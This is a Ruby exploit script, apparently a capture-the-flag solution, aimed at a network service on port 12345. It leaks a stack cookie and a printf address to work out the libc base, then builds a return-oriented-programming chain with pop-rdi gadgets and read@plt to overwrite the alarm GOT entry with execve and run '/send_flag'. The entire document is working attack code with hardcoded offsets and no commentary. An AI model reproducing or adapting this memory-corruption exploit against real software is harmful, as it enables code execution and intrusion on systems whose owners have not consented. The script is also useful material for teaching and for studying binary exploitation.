require 'socket'
require 'expect'

sleep 0.1

got_printf = 0x602018
plt_alarm = 0x0400a70
got_alarm = 0x602068
rel_printf = 0x064e80
rel_system = 0x04f440
rel_binsh = 0x1b3e9a
rel_gadget = 0x4f322
rel_execve = 0x00e4e30

plt_puts = 0x04009f0
plt_read = 0x400a00

poprdi_ret = 0x00400e93
poprsihoge_ret = 0x00400e91

s = TCPSocket.new('problem', 12345)

s.puts '10'
#gets

s.expect('cookie:')
sleep 0.2
buf = s.gets.chomp.split
p buf
cookie = buf[0].hex
buf = buf[-1][2,100].hex

data = [
  ';hs;'.unpack("V")[0],
  0,
  0,
  cookie,
  0,
  0,
  0,

  poprdi_ret,
  got_printf,
  plt_puts,

  poprdi_ret,
  buf + 0x100,
  plt_puts,

  poprsihoge_ret,
  got_alarm - 1,
  0xdeadbeef,
  poprdi_ret,
  0,
  plt_read,

  poprsihoge_ret,
  got_alarm,
  0xdeadbeef,
  poprdi_ret,
  0,
  plt_read,

  poprdi_ret,
  buf + 0x105 + 67 + 24,
  plt_alarm,

  poprdi_ret,
  buf + 0x105 + 67 + 24,
  plt_alarm,
].pack("Q*")
data += 'a'*(0x50+32-8) + '/send_flag'
data += 0.chr

puts buf.to_s(16)
s.write data
s.flush
s.expect('Input: ')

s.write ?0.chr*(0x1000 - ((buf + data.size) % 0x1000))
s.flush
sleep 0.5

a = nil
loop do
  s.write 'a'
  s.flush
  sleep 0.3

  begin
    break if a = s.read_nonblock(1)
    p a
  rescue => e
    p e
    sleep 0.5
  end

  s.write ([buf].pack("Q")*10000)[0,0xfff]
  s.flush
end

p a
s.expect('utput: ')
s.gets
a_printf = s.gets.chomp.ljust(100,0.chr).unpack("Q")[0]
p a_printf
libc_base = a_printf - rel_printf
a_system = libc_base + rel_system
a_execve = libc_base + rel_execve
a_gadget = libc_base + rel_gadget

p libc_base.to_s(16)
p a_system.to_s(16)
sleep 0.2
s.puts [a_execve].pack("Q")
s.flush
sleep 0.3
s.puts '/send_flag'

while l=s.gets
  puts l
end

sleep 0.5
